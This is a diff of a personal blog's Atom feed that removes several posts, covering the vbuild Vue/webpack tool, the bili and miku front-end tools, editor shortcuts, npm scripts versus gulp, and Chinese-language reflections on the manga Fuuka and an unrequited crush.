@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://blog.whilte.cn/"/>
-  <updated>2017-04-23T10:44:16.171Z</updated>
+  <updated>2017-04-23T10:38:26.184Z</updated>
   <id>https://blog.whilte.cn/</id>
   
   <author>
@@ -16,917 +16,883 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>vbuild</title>
-    <link href="https://blog.whilte.cn/2017/02/15/vbuild/"/>
-    <id>https://blog.whilte.cn/2017/02/15/vbuild/</id>
-    <published>2017-02-15T11:36:26.000Z</published>
-    <updated>2017-04-23T10:44:16.171Z</updated>
-    
-    <content type="html"><![CDATA[<p>I’m very proud to announce <a href="https://github.com/egoist/vbuild" target="_blank" rel="external">vbuild 6</a>, an opinionated but configurable Webpack wrapper for bundling front-end Vue.js apps, allowing you to use Webpack like a pro! No decision-making while reducing boilerplate code, solving problems like when to split vendor code, how to manage static files, CSS extracting et al.</p>
-<p><img class="border-image" src="https://ooo.0o0.ooo/2017/02/17/58a6cc0680006.png" alt="preview"></p>
-<p>To start using, all you need is to write your app directly, let’s say <code>index.js</code>:</p>
-<pre><code class="jsx">import Vue from &#39;vue&#39;
-
-new Vue({
-  el: &#39;#app&#39;,
-  render: h =&gt; &lt;h1&gt;Hello World!&lt;/h1&gt;
-})
-</code></pre>
-<p>Without <code>vbuild</code>, you need to create a <code>webpack.config.js</code> with a lot of boilerplate code, and install many dev dependencies in <code>package.json</code>, which is very verbose to perform.</p>
-<p>Now we can run a single command <code>vbuild --dev</code> to replace the process above.</p>
-<p>This blog post will go into the philosophy and design decisions of the project. To learn how to use vbuild instead, please refer to the <a href="https://github.com/egoist/vbuild#readme" target="_blank" rel="external">README</a>, where you can learn the entirety of the tool’s capabilities in just a few minutes.</p>
-<p>First we’ll dive into the <a href="#background">background</a> of this project.</p>
-<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>In the past few years, bundlers like Webpack and browserify have taken over the market. Before that, Gulp had just made some progress in the process of replacing Grunt as the major build tool of front-end assets.</p>
-<p>The main reason that Gulp is replacing Grunt is the <strong>simplicity</strong> in my opinion. Who knows that I had been using PHP for years before meeting Node.js, developing and deploying PHP apps is that stupidly fast and easy.</p>
-<p>Since then, I’ve made my mind that I want to develop JavaScript apps in a simple way. At the same time, I did fall in love with <a href="https://github.com/sindresorhus/xo" target="_blank" rel="external">XO</a>, which is an ESLint wrapper that reduces the overhead of managing config files. vbuild is to Webpack as XO is to ESLint.</p>
-<h2 id="Why-Vue-js"><a href="#Why-Vue-js" class="headerlink" title="Why Vue.js"></a>Why Vue.js</h2><p>There’re similar tools like <a href="https://github.com/insin/nwb" target="_blank" rel="external">nwb</a> or <a href="https://github.com/facebookincubator/create-react-app" target="_blank" rel="external">create-react-app</a>, but vbuild is mainly for Vue.js.</p>
-<p>Despiting that vbuild has extra support for Vue’s single-file component, it actually works for all kinds of JavaScript frameworks! The <strong>no-config</strong> feature works better in Vue.js apps though.</p>
-<p>Have to note that, Vue.js itself is getting well with the idea <strong>no-config</strong>, you can use it directly in a <code>index.html</code> file, or work with any bundler, out-of-box nice development experience, hot-code reloading support, officially maintained router and state-managament library.</p>
-<h2 id="Future"><a href="#Future" class="headerlink" title="Future"></a>Future</h2><p>I do have some exciting future plans for vbuild, like <a href="https://github.com/egoist/vbuild/issues/112" target="_blank" rel="external">server-side rendering support</a> (I know there’s Nuxt.js already) and better testing experience for Vue.js app.</p>
-<p>Currently you can see vbuild’s <code>run</code> option, which allows you to perform custom build process instead of running webpack:</p>
-<pre><code class="js">module.exports = {
-  run(webpackConfig) {
-    // Your custom logic...
-  }
-}
-</code></pre>
-<p>If you’re interested in contributing, please join the party, check out the <a href="https://github.com/egoist/vbuild/issues" target="_blank" rel="external">issue tracker</a> or contact me personally on Twitter <a href="https://twitter.com/rem_rin_rin" target="_blank" rel="external">@rem_rin_rin</a>.</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;I’m very proud to announce &lt;a href=&quot;https://github.com/egoist/vbuild&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;vbuild 6&lt;/a&gt;, an opinionated but con
-    
-    </summary>
-    
-    
-      <category term="vue" scheme="https://blog.whilte.cn/tags/vue/"/>
-    
-      <category term="webpack" scheme="https://blog.whilte.cn/tags/webpack/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>风夏的前世今生</title>
-    <link href="https://blog.whilte.cn/2017/02/11/fuuka-fate/"/>
-    <id>https://blog.whilte.cn/2017/02/11/fuuka-fate/</id>
-    <published>2017-02-11T11:59:29.000Z</published>
-    <updated>2017-04-23T10:44:16.167Z</updated>
-    
-    <content type="html"><![CDATA[<p>风夏的父亲是作为日本代表获得世界田径锦标赛百米亚军的秋月大和，说起来那也算是一段传奇了。</p>
-<p>大和本是所谓田径这类运动的门外汉，体力好可能是他与其唯一能扯上关系的东西了。从乡下老家去东京上高中无疑拓宽了大和的视野，初次游览新学校就领略到了运动之美 —— 一个短头发的女孩身着田径运动员特有的露脐装跃跃欲试，只见女孩突然急行加速绕了一个弧形来到横杆面前，一个侧身，呜哇，绝赞的一跃！</p>
-<p>大和看呆了，女孩的上半身逐渐和横杆平行并超越，即将过杆时横杆与女孩的眼睛、胸部、双腿构成的抛物线让大和似乎有了亲临运动场的实感，绝美的一幕。</p>
-<p>如果这样的场景不能让大和对她一见钟情，那么一见钟情这几个字还有什么实在意义呢。这个像凉风一样的女孩吹进了大和的心里，开启了大和和凉风的故事。</p>
-<p>讲述了风夏父母的初见，该说风夏的谢幕了。对啊，风夏死了，死了啊。大和与凉风经历了许多才最终在一起，甚至最后因为凉风怀孕双双放弃学业和田径开始步入社会，维持一个家庭，和刚刚诞生的秋月风夏组成的三口之家。</p>
-<p>最终这个让他们做出人生重大决定的女儿就这样简单地消失了。没有意义吗，有意义吗，意义在哪呢。</p>
-<p>这不只是牵扯到大和与凉风的梦想，风夏不也有吗，是啊，风夏也长大了，到了大和与凉风初识的那个年纪，也有了自己想做的事。风夏不喜欢手机，因为用手机玩游戏上网维持虚拟的人际关系不如现实中来的有实感，风夏喜欢听歌，常常头戴耳机站在学校天台上望着夏日的风景。</p>
-<p>风夏极其灵动，活泼开朗的性格很难让你想到她这静的一面。在天台听着歌远眺的模样足以获得当年凉风越过横杆时获得的倾慕。</p>
-<p>风夏的男朋友是个沉迷推特的年轻人，也是她的同班同学。在他突然转来风夏班里的时候还发生了被风夏当做偷拍内裤的变态而把手机摔碎的事。很难想象不用手机的风夏会和他在一起吧，可是这又有什么问题呢。</p>
-<p>风夏出事故的那天本来是她梦想开始的一天。优的到来让风夏找到了自己想做的事，与其说是一种指引不如说是一种鼓励，优喜欢赞美风夏的声音，唱起歌来纯洁有力，像有空灵般的穿透力。风夏的声音很大也让优有所领教，在八公像前大喊着优的名字让周围所有人都犯了尴尬症。优说那就做乐队吧，风夏的声音没有问题的，与其说是没有问题不如说太好听了，不做音乐简直浪费。就是这样，这一天本来是风夏和优的乐队第一次登场比赛的时候，风夏却在路上遭遇了车祸。</p>
-<p>比赛时风夏迟迟不来，没办法风夏又不用手机也无法联系，优被乐队成员和主办方强推到了主唱的位置。最终结果却令现场所有人瞠目结舌，原来像风夏那样天才般的歌声这个乐队还有一人拥有！</p>
-<p>可是这一切似乎没有了意义，有一些东西谁都无法躲避。比赛之后，优在风夏走过的路的一旁坐着，手里拿着的手机早也关了机。路旁经过的小孩子看上去很好奇就问：大哥哥，你在等人吗？诶手机没电了是要给女朋友打电话吗。优看起来还是和平常一样，只是双手撑着长椅：是啊，可是我女朋友不用手机的。</p>
-<p>优很自责，为什么那天自己没有和风夏一起去比赛，为什么风夏死了连自暴自弃的勇气都没有，脸上绷直的表情想要竭力维持一个正常人的模样。</p>
-<p>可是风夏确实离开了，在那之后优想继续实现风夏理想，经过多次劝说之前的乐队成员也都再一次回来了，毕竟是风夏选择的成员。风夏离开一年后，第二次比赛，来了。</p>
-<p>那是一天夜里，优来到比赛场馆附近看看，走出车站被人群里窜出的歌声所吸引，这不是风夏和他最喜欢的「星落的小镇」吗。穿过人群，优看到了弹着吉他唱歌的女孩，虽然也不是长发，虽然有些相似，可是这个女孩和风夏还是有些差别，风夏可不怎么弹吉他。如果说风夏像是天使，而这个女孩就像出现在优眼前的精灵。</p>
-<p>突然感到的寒意让优意识到了时间，回过神来周围已经没人了，有的只是还在弹奏的女孩。优试着问：你还要弹到什么时候，虽然我也很喜欢继续听就是了，可是这么晚女孩子回家不太安全吧。女生听了满不高兴的样子：哼，谁叫你听得那么入迷啊，这样的话我怎么好一个人自说自话地离开啊！优顿时脸就红了，不过幸好有人来解了围，不幸的是来者乃车站管理人员，而且还凶恶地走过来问道：诶你们在这里干什么啊，要摆摊到别处啊！女孩见此情形拎起吉他包甩给优说到：快跑！</p>
-<p>听着风声过了一会儿，女孩叫优停下：现在应该没问题了，在台阶那里休息一下吧。女孩的穿着十分摩登，和这把吉他很配，黑色短夹克里面是性感但不失稳重的背心，下面穿着的则是短牛仔裤。优有些不自然就想找些话题：你的歌真好听啊，正巧我也是做乐队的，来这附近就是来参加比赛的。女孩听了略感惊讶，原来她的乐队也会在这次比赛中登场，于是她就开这玩笑让优给她唱一段。优唱了一段「星落的小镇」，女孩似乎也听得很入神，两人居然坐着唱歌唱到了第二天早上！最后这个要强的女孩和优约定要在比赛场上决胜负：你叫优是吧，不用手机确实挺奇怪的，不过无所谓啦，反正过几天比赛上会见的 ——</p>
-<p>优：对了你还没说你叫什么呢！<br>女孩：风夏，碧井风夏。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;风夏的父亲是作为日本代表获得世界田径锦标赛百米亚军的秋月大和，说起来那也算是一段传奇了。&lt;/p&gt;
-&lt;p&gt;大和本是所谓田径这类运动的门外汉，体力好可能是他与其唯一能扯上关系的东西了。从乡下老家去东京上高中无疑拓宽了大和的视野，初次游览新学校就领略到了运动之美 —— 一个短头发
-    
-    </summary>
-    
-    
-      <category term="fuuka" scheme="https://blog.whilte.cn/tags/fuuka/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>单相思</title>
-    <link href="https://blog.whilte.cn/2017/01/26/unrequited-love/"/>
-    <id>https://blog.whilte.cn/2017/01/26/unrequited-love/</id>
-    <published>2017-01-26T01:54:00.000Z</published>
-    <updated>2017-04-23T10:44:16.171Z</updated>
-    
-    <content type="html"><![CDATA[<p>我特意去查了初恋的定义，果然那段不能叫初恋啊，毕竟我还没问过她愿不愿意做我女朋友。于是我又想是暗恋吗，应该不可能，她可是知道得一清二楚，而且也算有几次能称得上是「约会」的好事发生呢。果然还是只能勉强叫做单相思吧，虽然她也似乎不讨厌我，估计是想相处试试 😄 最后终于没有合格，连败部复活赛都没有。</p>
-<p>现在想想之前很生气的我真是很蠢呢，明明也是一段开心的时光。不过为什么在大年三十我想起这些陈年旧事呢，大概是因为不知道她最近过得怎么样了，虽然我不可思议的还记得她的手机号（没什么特别的，我以前用过的手机号也都记得），还是不要打扰吧，她已经有真正重要的东西了。</p>
-<iframe width="100%" height="166" scrolling="no" frameborder="no" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/61923187&amp;color=ff5500&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false"></iframe>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;我特意去查了初恋的定义，果然那段不能叫初恋啊，毕竟我还没问过她愿不愿意做我女朋友。于是我又想是暗恋吗，应该不可能，她可是知道得一清二楚，而且也算有几次能称得上是「约会」的好事发生呢。果然还是只能勉强叫做单相思吧，虽然她也似乎不讨厌我，估计是想相处试试 😄 最后终于没有合格
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>拥有能够眺望的远方</title>
-    <link href="https://blog.whilte.cn/2017/01/12/this-is-how-it-started/"/>
-    <id>https://blog.whilte.cn/2017/01/12/this-is-how-it-started/</id>
-    <published>2017-01-12T09:56:09.000Z</published>
-    <updated>2017-04-23T10:44:16.171Z</updated>
-    
-    <content type="html"><![CDATA[<p>最近看了冬季新番「风夏」，本来只是普通地再一次被女主角打动而已，可是在无意看了评论区之后心情却变成另一个极端。</p>
-<blockquote>
-<p>风夏在漫画里死了。</p>
-</blockquote>
-<p>虽然女主角死掉的漫画和动画都有，可是上了作品标题同时死了的还是非常令人难以相信，更何况是如此打动我的风夏。</p>
-<p>于是第二天按耐不住好奇，彻夜看完了风夏的漫画(正在连载的部分)。就算知道风夏会死，我也没想到在第 37 话就说了再见，而且似乎「什么都还没有做」就离开了，甚至后来还出现了另一个叫风夏的。很多人诟病的是作者冷酷地对待自己作品里的角色和自己的读者，我也曾经这样觉得，因为一想到后面那么多的故事不是风夏和男主来一起经历那还有什么意义啊，我就忍不住想和男主一起哭。</p>
-<blockquote>
-<p>我总想的是: 如果是风夏在这里会怎样呢?</p>
-</blockquote>
-<p>很残忍，令人难过。听说作者濑尾公治是小时候看了「哆啦A梦」之后便想成为一个漫画家。惊人地相似，我在看过濑尾的「涼風」「風夏」之后，虽说不至于做梦成为漫画家，可是也想画出令自己觉得残忍和难过的作品呢。</p>
-<hr>
-<p>于是我今天开始学习画画了，正因如此对于代码和开源我可能一段时间内不会碰了。</p>
-<p>那以后有机会画给你瞧瞧吧 :D</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;最近看了冬季新番「风夏」，本来只是普通地再一次被女主角打动而已，可是在无意看了评论区之后心情却变成另一个极端。&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;风夏在漫画里死了。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;虽然女主角死掉的漫画和动画都有，可是上了作品标题同时死了的还
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>miku: 一般性前端调试工具</title>
-    <link href="https://blog.whilte.cn/2016/12/18/miku/"/>
-    <id>https://blog.whilte.cn/2016/12/18/miku/</id>
-    <published>2016-12-18T11:21:17.000Z</published>
-    <updated>2017-04-23T10:44:16.171Z</updated>
-    
-    <content type="html"><![CDATA[<p>你大概知道 jsbin、jsfiddle、codepen 这些在线代码调试工具，我经常使用 jsbin 不过它们都有各自的局限性:</p>
-<ul>
-<li>编辑器不够强大，毕竟是在线工具</li>
-<li>没有模块系统支持，调用第三方库只能通过 script 标签引用 UMD 格式的文件</li>
-<li>局限于 HTML/CSS/JS </li>
-</ul>
-<p>所以我用我经常使用的 webpack 做了一个基于它的代码调试工具叫做 <a href="https://github.com/egoist/miku" target="_blank" rel="external"><strong>miku</strong></a>，它主要就是解决了上述工具存在的不足。</p>
-<pre><code class="bash">miku example.js example.css
-</code></pre>
-<p>miku 的原理就是你提供一些想测试的文件，比如叫 <code>example.js</code> 和 <code>example.css</code> 。它会将这些文件作为 webpack 的入口文件编译，然后通过 <a href="https://github.com/ampedandwired/html-webpack-plugin" target="_blank" rel="external">html-webpack-plugin</a> 用一个 html 文件加载，最后通过服务器渲染出来，你就能打开浏览器看到显示效果了。</p>
-<p>这样做的好处是你能充分享受 webpack 的功能，我们都知道 webpack 的配置虽不是什么高难度的事但也是挺麻烦的，尤其当你有很多项目的时候。现在你可以直接运行 miku 通过预配置的 webpack 运行你的 demo 了。</p>
-<p>miku 默认添加了很多常用的 loader 配置:</p>
-<ul>
-<li>postcss</li>
-<li>babel</li>
-<li>coffeescriot</li>
-<li>typescript</li>
-<li>sass</li>
-<li>less</li>
-<li>pug</li>
-<li>livescript</li>
-</ul>
-<p>等等…… 而且图片和字体文件也用 file-loader 做了处理，svg 文件则使用 raw-loader 加载。</p>
-<p>当然「直接在浏览器中编辑 JS/CSS」那种在线调试工具的方便暂时也无可替代，虽然也有 <a href="http://webpackbin.com" target="_blank" rel="external">webpackbin</a> <a href="http://esnextb.in" target="_blank" rel="external">esnextbin</a> <a href="http://requirebin.com/" target="_blank" rel="external">requirebin</a> 基于 bundler 的在线调试工具，不过我不只是想调试，也想让文件存在于我的本地磁盘里。</p>
-<h2 id="由来"><a href="#由来" class="headerlink" title="由来"></a><span>由来</span></h2><p>任何事情都不是空穴来风，我的轮子尤其如此。我昨晚在搞一个叫做 <code>real-dom</code> 的项目，之后我才发现很类似 <a href="https://github.com/pakastin/redom" target="_blank" rel="external">redom</a>，不过当时我有个「做个 example」的需求，手动预览这些用了 babel 的项目真的挺麻烦，所以想做这样一个东西。</p>
-<p><strong>虽然我之前的那个 <a href="https://github.com/egoist/vbuild" target="_blank" rel="external">vbuild</a> 几乎能胜任这项任务，不过我之后联想到了 jsbin，就有是不是能继续往这方面发展的想法。</strong> 所以又一个轮子诞生了。</p>
-<blockquote>
-<p>Just build things. It doesn’t matter if someone else thinks it’s a bad idea as long as you think it isn’t. Really.</p>
-</blockquote>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;你大概知道 jsbin、jsfiddle、codepen 这些在线代码调试工具，我经常使用 jsbin 不过它们都有各自的局限性:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;编辑器不够强大，毕竟是在线工具&lt;/li&gt;
-&lt;li&gt;没有模块系统支持，调用第三方库只能通过 script 标签引用 U
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>优雅地打包前端 JavaScript 库</title>
-    <link href="https://blog.whilte.cn/2016/11/16/bundle-front-end-js-library/"/>
-    <id>https://blog.whilte.cn/2016/11/16/bundle-front-end-js-library/</id>
-    <published>2016-11-16T07:55:48.000Z</published>
-    <updated>2017-04-23T10:44:16.167Z</updated>
-    
-    <content type="html"><![CDATA[<p>打包 JS 库没有打包 Web App 那样复杂，但还是可以变得更简单。</p>
-<h2 id="常见用例"><a href="#常见用例" class="headerlink" title="常见用例"></a><span>常见用例</span></h2><p>一个 JS 库一般需要一个 CommonJS 版本，它不会打包 node_modules 里的模块。以及一个 UMD 版本的，用于在浏览器中直接使用，它会打包 node_modules 里的模块。</p>
-<p>使用 <a href="https://github.com/universe-denpa/bili" target="_blank" rel="external">bili</a> 一切都会变得简单，简单到只需要一条命令:</p>
-<pre><code class="bash">bili --format cjs --format umd --module-name MyModule
-</code></pre>
-<p>这条命令的意思是打包 <code>./src/index.js</code> 到 <code>./dist</code> 目录，并且转换成 <code>CommonJS</code> 和 <code>UMD</code> 格式的文件，其中 <code>UMD</code> 格式中模块名设定为 <code>MyModule</code>，这样在浏览器中就可以通过全局变量 <code>MyModule</code> 引用。</p>
-<p>如果你同时需要一个压缩后的 UMD 格式文件，直接加上 <code>--compress</code> 参数就能额外得到一个 <code>.min.js</code> 和它的 <code>sourcemap</code> 文件。</p>
-<h2 id="ES2015"><a href="#ES2015" class="headerlink" title="ES2015"></a><span>ES2015</span></h2><p>打包的一个目的就是使用 Babel 之类的转换器编译 ES next 到 ES5，bili 默认使用 <a href="https://buble.surge.sh/guide" target="_blank" rel="external">buble</a> 来转换 JavaScript 代码，相比 Babel 它更轻量。</p>
-<p>你当然也可以在 bili 中使用 babel 来编译代码，这需要用到 bili 的配置文件 <code>bili.config.js</code>:</p>
-<pre><code class="js">module.exports = {
-  jsCompiler: require(&#39;rollup-plugin-babel&#39;)({
-    presets: [&#39;preset&#39;]
-  })
-}
-</code></pre>
-<p>bili 是基于 <a href="https://github.com/rollup/rollup" target="_blank" rel="external">Rollup</a> 的，所以相关 Rollup 插件都可以用来编译 JS 代码。</p>
-<h2 id="Buble"><a href="#Buble" class="headerlink" title="Buble"></a><span>Buble</span></h2><p>正如之前说了，默认我们使用 <code>buble</code>，你可以在配置文件中更改 buble 的配置参数:</p>
-<pre><code class="js">module.exports = {
-  buble: {
-    objectAssign: &#39;objectAssign&#39;
-  }
-}
-</code></pre>
-<p>值得一提的是，buble 不支持 <code>async/await</code> 并且不能将 <code>generator</code> 转换成 ES5 代码，所以我们保留了 generator 代码并且用 <a href="https://github.com/leebyron/async-to-gen" target="_blank" rel="external">async-to-gen</a> 将 <code>async/await</code> 转换到 <code>generator</code>，如果用到了这两个请考虑浏览器兼容性，或者换成 babel 来编译。</p>
-<h2 id="Watch-mode"><a href="#Watch-mode" class="headerlink" title="Watch mode"></a><span>Watch mode</span></h2><p>在开发的时候编译代码没有 <code>watch</code> 模式会非常痛苦，想开启 bili 的 watch 模式可以直接加上 <code>--watch</code> 参数。</p>
-<h2 id="更多资料"><a href="#更多资料" class="headerlink" title="更多资料"></a><span>更多资料</span></h2><p>bili 还内置了一些常用的 Rollup 插件，更多使用方法请参考 bili 的 <a href="https://github.com/universe-denpa/bili/wiki" target="_blank" rel="external">GitHub Wiki</a> 页面。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;打包 JS 库没有打包 Web App 那样复杂，但还是可以变得更简单。&lt;/p&gt;
-&lt;h2 id=&quot;常见用例&quot;&gt;&lt;a href=&quot;#常见用例&quot; class=&quot;headerlink&quot; title=&quot;常见用例&quot;&gt;&lt;/a&gt;&lt;span&gt;常见用例&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;一个 JS
-    
-    </summary>
-    
-    
-      <category term="javascript" scheme="https://blog.whilte.cn/tags/javascript/"/>
-    
-      <category term="bundle" scheme="https://blog.whilte.cn/tags/bundle/"/>
-    
-      <category term="bili" scheme="https://blog.whilte.cn/tags/bili/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Sublime Text 和 VS Code 常用快捷键</title>
-    <link href="https://blog.whilte.cn/2016/10/05/sublime-vscode-key-bindings/"/>
-    <id>https://blog.whilte.cn/2016/10/05/sublime-vscode-key-bindings/</id>
-    <published>2016-10-05T13:00:47.000Z</published>
-    <updated>2017-04-23T10:44:16.171Z</updated>
-    
-    <content type="html"><![CDATA[<p>为什么是 Sublime Text 和 VS Code 这样奇怪的组合一起说呢，因为目前为止我最喜欢这两个编辑器。当然 Atom 也非常好，如果启动速度更快的话也许我会用得更多。Sublime 的优点就是 UI 简单但不丑，也有些很不错的主题，这里面我最喜欢的就是 <a href="https://github.com/equinusocio/material-theme" target="_blank" rel="external">Material Theme</a>、<a href="https://github.com/samuelrafo/piatto" target="_blank" rel="external">Partto Theme</a> 以及 <a href="https://github.com/dempfi/ayu" target="_blank" rel="external">Ayu Theme</a>，相比之下 VS Code 的主题没那么风骚，但显得非常 「Solid」也挺耐看，不能说有个性就是了。</p>
-<p>不过不得不说， VS Code 作为编辑器的功能还是比 Sublime 强。</p>
-<h2 id="显示效果"><a href="#显示效果" class="headerlink" title="显示效果"></a><span>显示效果</span></h2><h3 id="重新打开刚刚关闭的标签页"><a href="#重新打开刚刚关闭的标签页" class="headerlink" title="重新打开刚刚关闭的标签页"></a>重新打开刚刚关闭的标签页</h3><p><kbd>Command</kbd> <kbd>Shift</kbd> <kbd>T</kbd></p>
-<h3 id="粘贴时自动缩进"><a href="#粘贴时自动缩进" class="headerlink" title="粘贴时自动缩进"></a>粘贴时自动缩进</h3><p><strong>Sublime</strong>: <kbd>Command</kbd> <kbd>Shift</kbd> <kbd>V</kbd><br><strong>VS Code</strong>: 不支持，但可以在粘贴后用 <kbd>Option</kbd> <kbd>Shift</kbd> <kbd>F</kbd> 替代，<a href="http://stackoverflow.com/questions/34627181/how-does-one-paste-and-indent-in-visual-studio-code" target="_blank" rel="external">查看更多</a></p>
-<h3 id="切换标签页"><a href="#切换标签页" class="headerlink" title="切换标签页"></a>切换标签页</h3><p><kbd>Command</kbd> <kbd>Option</kbd> <kbd>←/→</kbd></p>
-<h3 id="分割编辑器"><a href="#分割编辑器" class="headerlink" title="分割编辑器"></a>分割编辑器</h3><p>也就是把一个编辑器分成两个或多个块。</p>
-<p><strong>Sublime</strong>: <kbd>Command</kbd> <kbd>Option</kbd> <kbd>1/2</kbd><br><strong>VS Code</strong>: <kbd>Command</kbd> <kbd>\</kbd></p>
-<h3 id="显示-隐藏侧边栏"><a href="#显示-隐藏侧边栏" class="headerlink" title="显示 / 隐藏侧边栏"></a>显示 / 隐藏侧边栏</h3><p><strong>Sublime</strong>: <kbd>Command</kbd> <kbd>K B</kbd><br><strong>VS Code</strong>: <kbd>Command</kbd> <kbd>B</kbd></p>
-<h2 id="选取内容"><a href="#选取内容" class="headerlink" title="选取内容"></a><span>选取内容</span></h2><h3 id="选取光标附近的内容"><a href="#选取光标附近的内容" class="headerlink" title="选取光标附近的内容"></a>选取光标附近的内容</h3><p>通常是一个单词，连按 d 会继续选取下一个相同的内容。</p>
-<p><kbd>Command</kbd> <kbd>D</kbd></p>
-<h3 id="往左-右选取一个字符"><a href="#往左-右选取一个字符" class="headerlink" title="往左 / 右选取一个字符"></a>往左 / 右选取一个字符</h3><p>通常与上一步一起使用进行更精确的选取。</p>
-<p><kbd>Shift</kbd> <kbd>←/→</kbd></p>
-<h3 id="选取光标所在的行"><a href="#选取光标所在的行" class="headerlink" title="选取光标所在的行"></a>选取光标所在的行</h3><p>同样，连按会继续选取下一行。</p>
-<p><strong>Sublime</strong>: <kbd>Command</kbd> <kbd>L</kbd><br><strong>VS Code</strong>: <kbd>Command</kbd> <kbd>I</kbd></p>
-<h3 id="将光标移至选取的每一行末尾"><a href="#将光标移至选取的每一行末尾" class="headerlink" title="将光标移至选取的每一行末尾"></a>将光标移至选取的每一行末尾</h3><p>通常与上一步一起操作，用于多行编辑。</p>
-<p><strong>Sublime</strong>: <kbd>Command</kbd> <kbd>Shift</kbd> <kbd>L</kbd><br><strong>VS Code</strong>: <kbd>Control</kbd> <kbd>Option</kbd> <kbd>I</kbd></p>
-<h3 id="在多个位置显示光标"><a href="#在多个位置显示光标" class="headerlink" title="在多个位置显示光标"></a>在多个位置显示光标</h3><p><strong>Sublime</strong>: <kbd>Command</kbd> <kbd>点击</kbd><br><strong>VS Code</strong>: <kbd>Option</kbd> <kbd>点击</kbd></p>
-<h3 id="将光标移至行首-行尾"><a href="#将光标移至行首-行尾" class="headerlink" title="将光标移至行首 / 行尾"></a>将光标移至行首 / 行尾</h3><p><kbd>Command</kbd> <kbd>←/→</kbd></p>
-<h3 id="从光标所在位置选取到行首-行尾的内容"><a href="#从光标所在位置选取到行首-行尾的内容" class="headerlink" title="从光标所在位置选取到行首 / 行尾的内容"></a>从光标所在位置选取到行首 / 行尾的内容</h3><p><kbd>Command</kbd> <kbd>Shift</kbd> <kbd>←/→</kbd></p>
-<h2 id="查找内容"><a href="#查找内容" class="headerlink" title="查找内容"></a><span>查找内容</span></h2><h3 id="搜索项目中的文件"><a href="#搜索项目中的文件" class="headerlink" title="搜索项目中的文件"></a>搜索项目中的文件</h3><p><kbd>Command</kbd> <kbd>P</kbd></p>
-<h3 id="跳到指定的一行"><a href="#跳到指定的一行" class="headerlink" title="跳到指定的一行"></a>跳到指定的一行</h3><p><kbd>Control</kbd> <kbd>G</kbd></p>
-<h3 id="跳到函数定义"><a href="#跳到函数定义" class="headerlink" title="跳到函数定义"></a>跳到函数定义</h3><p><strong>Sublime</strong>: <kbd>Command</kbd> <kbd>R</kbd></p>
-<h2 id="移动内容"><a href="#移动内容" class="headerlink" title="移动内容"></a><span>移动内容</span></h2><h3 id="上下移动选取的内容"><a href="#上下移动选取的内容" class="headerlink" title="上下移动选取的内容"></a>上下移动选取的内容</h3><p><kbd>Command</kbd> <kbd>Control</kbd> <kbd>↑/↓</kbd></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;为什么是 Sublime Text 和 VS Code 这样奇怪的组合一起说呢，因为目前为止我最喜欢这两个编辑器。当然 Atom 也非常好，如果启动速度更快的话也许我会用得更多。Sublime 的优点就是 UI 简单但不丑，也有些很不错的主题，这里面我最喜欢的就是 &lt;a h
-    
-    </summary>
-    
-    
-      <category term="sublime" scheme="https://blog.whilte.cn/tags/sublime/"/>
-    
-      <category term="vs code" scheme="https://blog.whilte.cn/tags/vs-code/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>用 npm scripts 和 nswatch 替代 gulp</title>
-    <link href="https://blog.whilte.cn/2016/08/29/kill-gulp-with-npm-scripts-and-nswatch/"/>
-    <id>https://blog.whilte.cn/2016/08/29/kill-gulp-with-npm-scripts-and-nswatch/</id>
-    <published>2016-08-29T08:54:30.000Z</published>
-    <updated>2017-04-23T10:44:16.171Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="为什么用-npm-scripts"><a href="#为什么用-npm-scripts" class="headerlink" title="为什么用 npm scripts ?"></a><span>为什么用 npm scripts ?</span></h2><p>首先我觉得  <a href="https://medium.freecodecamp.com/why-i-left-gulp-and-grunt-for-npm-scripts-3d6853dd22b8#.8wsejnq0u" target="_blank" rel="external">Why I Left Gulp and Grunt for npm Scripts</a> 里说的不用 gulp 的理由基本没有道理:</p>
-<ol>
-<li>gulp 插件质量、数量和实时性</li>
-</ol>
-<p>作者抱怨 gulp 插件的质量取决于插件作者，这可以理解，<strong>但是 npm 的包同样取决于作者啊</strong>。</p>
-<p>作者抱怨 gulp 插件的数量不如 npm，<strong>这不是废话吗</strong>。</p>
-<p>作者抱怨 gulp 插件不能及时更新，比如 babel 6 升级了 gulp-babel 并没有立刻升级。<strong>又不是看直播，干嘛实时?</strong></p>
-<ol>
-<li>debug 很痛苦，gulp crash 掉是因为某个插件吗还是因为版本问题</li>
-</ol>
-<p>额，难道直接用 npm package 就没有这些问题吗。</p>
-<ol>
-<li>不连贯的文档，比如 gulp-eslint 和 eslint，eslint 的文档就是 gulp 插件的文档好得多</li>
-</ol>
-<p>这不又是废话吗，写个插件还要把用的包的文档重新写一遍?</p>
-<hr>
-<p>好了，原文挑剔 gulp 的理由全被扳倒了，但是其中支持 npm 的理由倒是挺有道理:</p>
-<ol>
-<li>npm scripts 并不需要你很擅长命令行操作</li>
-</ol>
